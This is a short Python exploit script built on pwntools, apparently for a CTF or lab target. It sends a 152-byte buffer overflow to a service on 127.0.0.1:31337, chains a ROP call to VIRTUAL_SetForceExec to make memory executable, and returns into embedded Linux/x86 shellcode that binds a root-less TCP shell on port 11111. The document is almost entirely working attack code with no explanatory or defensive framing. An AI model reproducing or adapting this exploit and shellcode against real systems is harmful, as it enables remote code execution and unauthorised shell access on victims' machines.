from pwn import *

# 836   Linux/x86   Tiny Shell Bind TCP - 73 bytes
# Written in 2013 by Geyslan G. Bem, Hacking bits
# http://shell-storm.org/shellcode/files/shellcode-836.php
# Opens tcp shell at port 11111
shellcode = ""
shellcode += "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
shellcode += "\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
shellcode += "\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
shellcode += "\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
shellcode += "\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
shellcode += "\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
shellcode += "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
shellcode += "\x41\xcd\x80"

VIRTUAL_SetForceExec_ptr    = 0x7bca1270
shellcode_ptr               = 0x33fcc0

# offset in exploitstr 152
exploitstr = "A"*152

# ROP-call to VIRTUAL_SetForceExec
exploitstr += p32(VIRTUAL_SetForceExec_ptr)			# [1]

# return to shellcode
exploitstr += p32(shellcode_ptr)				# [2]

# parameter to VIRTUAL_SetForceExec
exploitstr += p32(0x90909090)       # everything != 0 would work, # [3]
                                    # so we can put something usefull 
                                    # there as well
exploitstr += shellcode      

c = connect("127.0.0.1",31337)
c.send(exploitstr)